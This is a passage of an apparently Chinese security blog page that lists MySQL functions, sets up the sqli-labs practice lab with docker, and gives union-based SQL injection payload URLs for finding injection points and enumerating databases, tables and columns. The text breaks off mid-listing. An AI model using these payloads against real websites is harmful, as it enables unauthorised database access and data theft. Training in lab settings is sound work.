@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="mysql字符串函数、mysql数字函数、mysql日期函数、mysql高级函数 函数使用mysql字符串函数:    函数 作用    ascii(s) 返回字符串s的第一个字符的ascii码   char_length(s)\character_length(s) 返回字符串s的字符数   concat(s1,s2,…,sn) 合并s1,s2,…sn字符为一个字符   concat_ws(x,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mysql函数的利用">
+<meta property="og:url" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;">
+<meta property="og:site_name" content="Rj45&#39;s blog">
+<meta property="og:description" content="mysql字符串函数、mysql数字函数、mysql日期函数、mysql高级函数 函数使用mysql字符串函数:    函数 作用    ascii(s) 返回字符串s的第一个字符的ascii码   char_length(s)\character_length(s) 返回字符串s的字符数   concat(s1,s2,…,sn) 合并s1,s2,…sn字符为一个字符   concat_ws(x,">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;b.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;a.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;32.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;33.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;34.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;35.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;36.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;37.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;38.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;39.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;10.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;9.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;11.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;15.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;12.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;13.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;14.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;16.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;17.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;18.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;e.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;f.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;19.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;20.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;21.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;22.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;23.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;24.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;25.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;26.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;27.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;28.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;29.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;30.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;31.png">
+<meta property="og:updated_time" content="2019-08-22T13:32:38.429Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/my.jpg">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/my.jpg" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/my.jpg">
+          
+        
+    
+    <!-- title -->
+    <title>mysql函数的利用</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+<link rel="alternate" href="/atom.xml" title="Rj45's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/web/">web</a></li>
+         
+          <li><a href="/penetration/">penetration</a></li>
+         
+          <li><a href="/pwn/">pwn</a></li>
+         
+          <li><a href="/docker">docker</a></li>
+         
+          <li><a href="/resources/">resources</a></li>
+         
+          <li><a href="/firends/">firends</a></li>
+         
+          <li><a href="/about/">about</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/dhcp%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/docker%E7%9A%84%E5%AE%B9%E5%99%A8%E9%97%B4%E8%AE%BF%E9%97%AE/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/&text=mysql函数的利用" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/&title=mysql函数的利用" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/&is_video=false&description=mysql函数的利用" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=mysql函数的利用&body=Check out this article: https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/&title=mysql函数的利用" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/&title=mysql函数的利用" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/&title=mysql函数的利用" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/&title=mysql函数的利用" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/&name=mysql函数的利用&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#函数使用"><span class="toc-number">1.</span> <span class="toc-text">函数使用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#环境搭建"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#联合注入、布尔盲注与延时注入"><span class="toc-number">3.</span> <span class="toc-text">联合注入、布尔盲注与延时注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#函数在注入过程中的利用"><span class="toc-number">4.</span> <span class="toc-text">函数在注入过程中的利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql的udf"><span class="toc-number">5.</span> <span class="toc-text">mysql的udf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#演示："><span class="toc-number">6.</span> <span class="toc-text">演示：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mssql的xp-cmdshell与sp-oacreate"><span class="toc-number">7.</span> <span class="toc-text">mssql的xp_cmdshell与sp_oacreate</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">8.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        mysql函数的利用
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Rj45's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-08-19T15:35:09.000Z" itemprop="datePublished">2019-08-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>mysql字符串函数、mysql数字函数、mysql日期函数、mysql高级函数</p>
+<h1 id="函数使用"><a href="#函数使用" class="headerlink" title="函数使用"></a>函数使用</h1><p>mysql字符串函数:</p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">ascii(s)</td>
+<td align="left">返回字符串s的第一个字符的ascii码</td>
+</tr>
+<tr>
+<td align="left">char_length(s)\character_length(s)</td>
+<td align="left">返回字符串s的字符数</td>
+</tr>
+<tr>
+<td align="left">concat(s1,s2,…,sn)</td>
+<td align="left">合并s1,s2,…sn字符为一个字符</td>
+</tr>
+<tr>
+<td align="left">concat_ws(x,s1,s2,…,sn)</td>
+<td align="left">同上，不过x是字符串之间的分隔符</td>
+</tr>
+<tr>
+<td align="left">fleld(s,s1,s2,…)</td>
+<td align="left">返回一个字符串s在字符串列表(s1,s2,…)中的位置</td>
+</tr>
+<tr>
+<td align="left">flnd_in_set(s1,s2)</td>
+<td align="left">返回在字符串s2中与s1匹配的字符串的位置</td>
+</tr>
+<tr>
+<td align="left">format(x,n)</td>
+<td align="left">将数字x格式化，保留小数点后n位，最后一位四舍五入</td>
+</tr>
+<tr>
+<td align="left">insert(s1,x,len,s2)</td>
+<td align="left">s2替换s1的x位置开始长度为len的字符串</td>
+</tr>
+<tr>
+<td align="left">locate(s1,s)</td>
+<td align="left">从字符串s中获取s1的开始位置</td>
+</tr>
+<tr>
+<td align="left">lcase(s)</td>
+<td align="left">将字符串s的所有字母变为小写字母</td>
+</tr>
+<tr>
+<td align="left">left(s,n)</td>
+<td align="left">返回字符串s的前n个字符</td>
+</tr>
+<tr>
+<td align="left">lower(s)</td>
+<td align="left">将字符串s的所有字母变为小写字母</td>
+</tr>
+<tr>
+<td align="left">lpad(s1,len,s2)</td>
+<td align="left">在字符串s1的开始处填充字符串s2,使字符串长度达到len</td>
+</tr>
+<tr>
+<td align="left">ltrim(s)</td>
+<td align="left">去掉字符串s开始处的空格</td>
+</tr>
+<tr>
+<td align="left">mid(s,n,len)\substr(s,n,len)\substring(s,n,len)</td>
+<td align="left">从s中的n位置开始截取长度为len的子字符串</td>
+</tr>
+<tr>
+<td align="left">position(s1 in s)</td>
+<td align="left">从字符串s中获取s1的开始位置</td>
+</tr>
+<tr>
+<td align="left">repeat(s,n)</td>
+<td align="left">将字符串s重复n次</td>
+</tr>
+<tr>
+<td align="left">replace(s,s1,s2)</td>
+<td align="left">将字符串s2替代串s中的字符串s1</td>
+</tr>
+<tr>
+<td align="left">reverse(s)</td>
+<td align="left">将字符串s的顺序反过来</td>
+</tr>
+<tr>
+<td align="left">right(s,n)</td>
+<td align="left">返回字符串s的后n个字符</td>
+</tr>
+<tr>
+<td align="left">rpad(s1,len,s2)</td>
+<td align="left">在字符串s1的结尾处添加字符串s2,使字符串的长度达到len</td>
+</tr>
+<tr>
+<td align="left">rtrim(s)</td>
+<td align="left">去掉字符串s结尾处的空格</td>
+</tr>
+<tr>
+<td align="left">space(n)</td>
+<td align="left">返回n个空格</td>
+</tr>
+<tr>
+<td align="left">strcmp(s1,s2)</td>
+<td align="left">比较s1和s2，如相同返回0，s1&gt;s2返回1，否则返回-1</td>
+</tr>
+<tr>
+<td align="left">substring_index(s,delimiter,number)</td>
+<td align="left">返回从字符串s的第number个出现的分隔符delimiter之后的字串。如number是正数返回第number个字符左边的字符串。如number是负数返回第number的绝对值个字符右边的字符串。</td>
+</tr>
+<tr>
+<td align="left">trim(s)</td>
+<td align="left">去掉字符串s开始和结尾处的空格</td>
+</tr>
+<tr>
+<td align="left">ucase(s)\upper(s)</td>
+<td align="left">将字符串转换为大写</td>
+</tr>
+</tbody></table>
+<p>mysql数字函数:</p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">abs(x)</td>
+<td align="left">返回x的绝对值</td>
+</tr>
+<tr>
+<td align="left">acos(s)</td>
+<td align="left">求x的反余弦值</td>
+</tr>
+<tr>
+<td align="left">asin(x)</td>
+<td align="left">求x的正余弦值</td>
+</tr>
+<tr>
+<td align="left">atan(x)\atan2(x,m)</td>
+<td align="left">求x的反正切值</td>
+</tr>
+<tr>
+<td align="left">avg(expression)</td>
+<td align="left">求平均值</td>
+</tr>
+<tr>
+<td align="left">ceil(x)\ceiling(x)</td>
+<td align="left">返回大于或等于x的最小整数</td>
+</tr>
+<tr>
+<td align="left">cos(x)</td>
+<td align="left">求x的余弦值</td>
+</tr>
+<tr>
+<td align="left">cot(x)</td>
+<td align="left">求x的余切值</td>
+</tr>
+<tr>
+<td align="left">count(expression)</td>
+<td align="left">返回查询记录的总数</td>
+</tr>
+<tr>
+<td align="left">degrees(s)</td>
+<td align="left">将弧度转换为角度</td>
+</tr>
+<tr>
+<td align="left">n DIV m</td>
+<td align="left">整除，n 为被除数，m 为除数</td>
+</tr>
+<tr>
+<td align="left">exp(x)</td>
+<td align="left">返回e的x次方</td>
+</tr>
+<tr>
+<td align="left">floor(x)</td>
+<td align="left">返回小于或等于 x 的最大整数</td>
+</tr>
+<tr>
+<td align="left">greatest(expr1,expr2,expr3,…)</td>
+<td align="left">返回列表的最大值</td>
+</tr>
+<tr>
+<td align="left">least(expr1,expr2,expr3,…)</td>
+<td align="left">返回列表的最小值</td>
+</tr>
+<tr>
+<td align="left">ln(x)</td>
+<td align="left">返回数字的自然对数</td>
+</tr>
+<tr>
+<td align="left">log(x)</td>
+<td align="left">返回自然对数(以 e 为底的对数)</td>
+</tr>
+<tr>
+<td align="left">log10(x)</td>
+<td align="left">返回以10为底的对数</td>
+</tr>
+<tr>
+<td align="left">log2(x)</td>
+<td align="left">返回以2为底的对数</td>
+</tr>
+<tr>
+<td align="left">max(expr)</td>
+<td align="left">返回字段expr中的最大值</td>
+</tr>
+<tr>
+<td align="left">min(expr)</td>
+<td align="left">返回字段expr中的最小值</td>
+</tr>
+<tr>
+<td align="left">mod(x,y)</td>
+<td align="left">返回x除以y以后的余数</td>
+</tr>
+<tr>
+<td align="left">pi()</td>
+<td align="left">返回圆周率</td>
+</tr>
+<tr>
+<td align="left">pow(x,y)\power(x,y)</td>
+<td align="left">返回x的y次方</td>
+</tr>
+<tr>
+<td align="left">radians(x)</td>
+<td align="left">将角度转换为弧度</td>
+</tr>
+<tr>
+<td align="left">rand()</td>
+<td align="left">返回0到1的随机数</td>
+</tr>
+<tr>
+<td align="left">round(x)</td>
+<td align="left">返回离 x 最近的整数</td>
+</tr>
+<tr>
+<td align="left">sign(x)</td>
+<td align="left">返回x的符号：x 是负数、0、正数分别返回-1、0和1</td>
+</tr>
+<tr>
+<td align="left">sin(x)</td>
+<td align="left">求正弦值</td>
+</tr>
+<tr>
+<td align="left">sqrt(x)</td>
+<td align="left">求x的平方根</td>
+</tr>
+<tr>
+<td align="left">sum(expr)</td>
+<td align="left">求总和</td>
+</tr>
+<tr>
+<td align="left">tan(x)</td>
+<td align="left">求正切值</td>
+</tr>
+<tr>
+<td align="left">truncate(x,y)</td>
+<td align="left">返回数值x保留到小数点后y位的值</td>
+</tr>
+</tbody></table>
+<p>mysql日期函数:<br>略</p>
+<p>mysql高级函数:</p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">database()</td>
+<td align="left">返回当前数据库名</td>
+</tr>
+<tr>
+<td align="left">user()\system_user()\session_user()\current_user()</td>
+<td align="left">返回当前用户</td>
+</tr>
+<tr>
+<td align="left">version()</td>
+<td align="left">返回数据库的版本号</td>
+</tr>
+<tr>
+<td align="left">last_insert_id()</td>
+<td align="left">返回最近生成的 AUTO_INCREMENT 值</td>
+</tr>
+<tr>
+<td align="left">connection_id()</td>
+<td align="left">返回服务器的连接数</td>
+</tr>
+<tr>
+<td align="left">bin(x)</td>
+<td align="left">返回 x 的二进制编码</td>
+</tr>
+<tr>
+<td align="left">binary(s)</td>
+<td align="left">将字符串 s 转换为二进制字符串</td>
+</tr>
+<tr>
+<td align="left">cast(x as type)</td>
+<td align="left">返回参数中的第一个非空表达式（从左向右）</td>
+</tr>
+<tr>
+<td align="left">coalesce(expr1,expr2,…,expr_n)</td>
+<td align="left">返回参数中的第一个非空表达式（从左向右）</td>
+</tr>
+<tr>
+<td align="left">conv(x,f1,f2)</td>
+<td align="left">返回 f1 进制数变成 f2 进制数</td>
+</tr>
+<tr>
+<td align="left">convert(s using cs)</td>
+<td align="left">函数将字符串 s 的字符集变成 cs</td>
+</tr>
+<tr>
+<td align="left">if(expr,v1,v2)</td>
+<td align="left">如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2。</td>
+</tr>
+<tr>
+<td align="left">ifnull(v1,v2)</td>
+<td align="left">如果 v1 的值不为 NULL，则返回 v1，否则返回 v2</td>
+</tr>
+<tr>
+<td align="left">isnull(expr)</td>
+<td align="left">判断表达式是否为 NULL</td>
+</tr>
+<tr>
+<td align="left">nullif(expr1,expr2)</td>
+<td align="left">比较两个字符串，如果字符串 expr1 与 expr2 相等 返回 NULL，否则返回 expr1</td>
+</tr>
+</tbody></table>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>docker搭建sqli-labs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/c0ny1/vulstudy.git</span><br><span class="line">cd vulstudy/sqli-labs/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/1.png" alt></p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/2.png" alt></p>
+<h1 id="联合注入、布尔盲注与延时注入"><a href="#联合注入、布尔盲注与延时注入" class="headerlink" title="联合注入、布尔盲注与延时注入"></a>联合注入、布尔盲注与延时注入</h1><p>联合注入：</p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/b.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">注入点</span><br><span class="line">http://192.168.3.6/Less-1/?id=1&apos;</span><br><span class="line">http://192.168.3.6/Less-1/?id=1&apos; or &apos;1&apos; or &apos;1</span><br><span class="line">http://192.168.3.6/Less-1/?id=1&apos; or &apos;1=1-- -</span><br><span class="line">http://192.168.3.6/Less-1/?id=1&apos; or &apos;1=1--+</span><br><span class="line">http://192.168.3.6/Less-1/?id=1&apos; or 1=1%23</span><br><span class="line"></span><br><span class="line">判断字段数</span><br><span class="line">http://192.168.3.6/Less-1/?id=1&apos; order by 3 -- -</span><br><span class="line">http://192.168.3.6/Less-1/?id=1&apos; order by 4 -- -</span><br><span class="line"></span><br><span class="line">数据库基本信息</span><br><span class="line">http://192.168.3.6/Less-1/?id=0&apos; union select 0,database(),version() -- -</span><br><span class="line">http://192.168.3.6/Less-1/?id=0&apos; union select 0,current_user(),user() -- -</span><br><span class="line"></span><br><span class="line">数据库</span><br><span class="line">http://192.168.3.6/Less-1/?id=0&apos; union select 0,database(),group_concat(schema_name)from information_schema.schemata -- -</span><br><span class="line"></span><br><span class="line">数据表</span><br><span class="line">http://192.168.3.6/Less-1/?id=0&apos; union select 0,database(),group_concat(table_name)from information_schema.tables where table_schema=database() -- -</span><br><span class="line"></span><br><span class="line">数据列</span><br><span class="line">http://192.168.3.6/Less-1/?id=0&apos; union select 0,database(),group_concat(column_name)from information_schema.columns where table_schema=database() -- -</span><br><span class="line"></span><br><span class="line">数据</span><br><span 